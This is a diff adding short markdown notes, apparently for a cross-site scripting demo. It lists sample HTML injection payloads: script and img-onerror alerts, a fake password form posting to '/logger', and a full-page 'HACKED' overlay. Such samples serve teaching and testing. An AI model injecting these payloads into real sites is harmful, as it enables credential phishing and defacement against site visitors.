@@ -1,0 +1,39 @@
+# 01
+
+## Classic
+
+```
+Classic <script>alert(42)</script>
+```
+
+## img
+
+```
+Hello! <img src="/hahaha.jpg" onerror="alert(42)" />
+```
+
+## form
+
+```
+<form action="/logger>
+  Input your password: <input name="password" type="password" />
+
+  <input type="submit" />
+</form>
+```
+
+## style
+
+```
+<div style="background: red; color: yellow; position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%;">
+  HACKED
+</div>
+```
+
+# 02
+
+Just click
+
+# 03
+
+Show logging
